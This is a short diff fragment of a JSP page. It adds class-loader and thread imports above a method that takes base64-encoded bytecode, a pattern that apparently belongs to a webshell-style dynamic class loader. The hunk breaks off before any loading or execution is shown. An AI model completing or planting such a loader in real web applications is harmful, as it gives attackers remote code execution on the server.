@@ -1,3 +1,9 @@
+<%@ page import="java.lang.Class" %>
+<%@ page import="java.lang.ClassLoader" %>
+<%@ page import="java.lang.Exception" %>
+<%@ page import="java.lang.Object" %>
+<%@ page import="java.lang.String" %>
+<%@ page import="java.lang.Thread" %>
 <%!
     public byte[] decodeBase64(String bytecodeBase64) {
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
